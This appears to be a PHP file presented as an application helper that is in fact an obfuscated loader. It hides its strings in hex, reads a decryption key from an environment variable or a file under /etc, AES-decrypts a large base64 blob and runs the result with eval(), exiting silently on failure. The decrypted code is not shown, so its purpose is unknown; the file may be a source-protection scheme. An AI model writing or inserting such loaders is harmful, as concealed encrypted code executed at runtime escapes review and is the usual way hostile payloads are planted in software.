<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mLbCiiRYAFMfCebKJGk1Sw==');

$c=base64_decode(

'd6F1NWAeWv1e/Ne4Fsef93kXdCOxLMvakL2Qs2miF/Bimz1MeNtbXtmDQtlmvL2UshklYVXS6exw' .
'gGJrdAU0hPL6diK4NcvEx15sYK5bBu7CspsTR98V3iOhgq6s6bvn7nD/d3LuYyqJZLqR42Cmp9go' .
'FWDW33v7LhFgKRxbhXjGTbp3unOoUxBEu9TSAdFLoIwduijvD2Q1qO5f5o95wZdTfnXdieNQTUXo' .
'Rz7RfQPGFUtc7R0u9EyNdTg/7PRLstV8z/vN26irbO4+sRAoY3EbfZAOE//Ja2Gqk0u23toYwUTd' .
'uz6vQ2GSdM8SrtoopDntvghgh9OPn1l7NEZ9Jz7E8FF0bIVoljtJDgzPOJWKm7j5HhT9e4jpLiN8' .
'qNyGfNEXKNXzXU/XozIHStEA/5UGCwmoHxY8ZccQkemN+vD+D8rh653WG3Wt25ZPE3C7VjHvvET+' .
'Il0ZTk8SBcrvAai3nriwZQZbVTBDwq4uWzcwUVEdz0PehD9AkwaWXmlDtILw6UFdGR/w2cJZKiIF' .
'HKthuDzV/lWoNfMs+CWplqvFgXRHpNPzHAwURktqi14Ez6+N1ge1daQwsaf0RcAohWlPPki1BD1P' .
'HH/Zv1V9XOQdGsXQNHclgQJNfbeMleZrCf14ONmIJxfz6K7rPt2SX72XeP2gry8B1sxPWxMRC1bb' .
'XgK239wnjhHQavonH7NXLvsTp61F+QBBDt1tJZuQiANRm513p4c9ENPwmbu3t934SN6DHXADNGjN' .
'yRWPjxLGU1EGpz18Ou8lYomGQGrMrhW36ZQ4Wt110n7VqO7duLpES9BlsNXsmCQpEXW1U1sGSCTg' .
'CKiekoC9e/CjxikzXUH34b/f6r8IyeRUi3nrwkR45ykwK606Nfzk9+e/n7gzSTp552QxmlEm4PE5' .
'hEkdhcj23qnvB7n/7GhCda2tr1cLhwQlw1ffXunhJOYKTAfrJauFU0d2vcQKUBfnfZobhMI3pZ0T' .
'ALmzcb/+Z9gIofeb++sNsHDyHkmEWKE7UOKQGIs8uHw0dAMhiWJHNYboRX8rmfHoSj9LVL2I85jo' .
'zL4sHSsdScKQ/OMeX8AVxxpdxEgO0afpBcMGRLa1aIjRvIZWJNn2IuNYx6WAh3CkfQEONV7hBrQc' .
'NEWckFjuwXijuTbZM0mBtkg6SkDucOJcPT7g/xSv6MWq5dhBZD3W3A9Sdsk/UfW86nXe3ZN1imzF' .
'czBmxaSuQFMIIepwvVkCWDoWd/MRdfsHwM4BZYhv9GJz3aX9ubC0/pvoephg9xzisMIagJk4/EjC' .
'/dEM0ZvOuXm5i69u2lUhQLJBriXGOJqifOeuS4OZJtGtkwFj82DGokILDB1INzDUo3XTwaMI3MGf' .
'mq0dJoTzbgKw//7+kGNBodxXa+TM4CAYKYpyT5PqazhTEOP5+OZ/zeyqaNXbQ80q29dIiXDfzkLW' .
'D4vv9LQBZWDvDpTlG1eGZ0zFODtBdomAhItwe7b+/OWtG94xtjbgamyubrEvzAR+cXIi5pVVUBMC' .
'ntkTHHGKnLYvycViB0WDv/t7R4WPozi51cH7A6lA4hXMAl9kAp2bldj7dnNWVbQ+LMLQd7bc/Xen' .
'hn3Z6sXCOJo3hzf5vqx0iWODf1SAjiPhz3O2owmnICKWBYZayWZlNxwmx+IRtfqJEtzX/YlT/G4t' .
'YtUurmGAB5od+4kUd4s+teZh3k8nvSJBW0NcgcFAvP0X+T+PTrR92WVYp/mnciZX/Nt3SvMoaqKb' .
'ez71zkIobwPAvJL8iIFb3vafMYuSic9cb2BpxnX/av4tWQ/ea+3NvnhFpc2xt4WCQSTWqXhi4AO1' .
'2YKhir/Eb8rQtNra/XEBLKuX79aGWvElgyObew+8istqTSYD4cOWss6tM5PhNwCTozQNhwW+a3Y2' .
'1n6WZgQOBQ+PZ24qQzxeEEBY23iPmMHtHyOIxpFNHqpVSpe3K9Ut5cyxTTdZSbhNUPtV/s0ogRN+' .
'fiQoBSPOgfeP2658VocNDSIM9Mj9spGiq9cMldtFZ/t/WHBXIudsuul4n0qeeU12H+doStNB2Uqj' .
'iMT8GOm+BwR4Cwi0eeXRDgBwJuvJ5nSAf2f3XwwKJcBddYNC5HxuYbJISB5ZmQ3wj9M8yVaNh0se' .
'dwe97nCQ+maZkzvMgTgbl95WsubxPz0h0vl7KizdxQA78rvVwtjsdCGi/SLX3Vcu6gx4mw/hiD4y' .
'+VCTJZlT8K3WnsFzJ8Le7kkILrEw9dvAq/lkSC32qzVdSCcIoNmUe08jGJ21d3HhGcDVOiA9M9H1' .
'/F3V7ey1hdKUMKWh9CdxlpppeYB6la1OX2ocVH9Iv4hQZ8FurfMXvLeKncew1htn7OJ1rrP5IYSB' .
'JCo+PJt9JRpf7ts2Z9iH6b27vyl8MMoJhJ3ZBL6xNkvfKdTQcw+9YquNxL7+8wKCl9RX235ndb1K' .
'X3hw73RNPGbHnK5wFEUrxLoCZUW+zGKRGeCK75O15CWutE9DhDnV6skHItzEi9Ev8xATAEZxsd3l' .
'TiUFVkpbat5MXAOynWUoq0pH9ujQe9ejlSwqp5lJSf0j27n+fLwMbBwT2vFQMFR0t+/c2TUj4CPt' .
'4HE3a6+F3h+y2bjul8H+tqu+n5scrlfM7l2BDk0+e2Zjy2+xN4wOhh50OmQE1tiuf62iROiCPEf7' .
'dAwTbn93jxfLolcTa+WTrXmZFGM4Lh7T441LLCNgBy028AHvmhj/n1ipf87VQTJI1B4A2oJwLLFH' .
'JzxPF7ts+o2Aysi6cxQOBCTjZ6tfcibAsFwd4TFOTIrbxiKxYLD1QHwRPqyHp9iMpmm72UaWbbPg' .
'X0kcsuRcovZS5o7wSw4oHusKGvar09cthCARvpoWLK+EQReb3YT9FrZxsOWb0SMYt+mtWCb7Q6pL' .
'QNKZ5Yg7giTdTQCetWKuyOCH1N7vlpf9lwu8HDf0s2I2Lb58b9YU24k7cUw8kZXHorqM6H5/geMP' .
'WqYbejvn5pQqhsxzE1QBBWA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

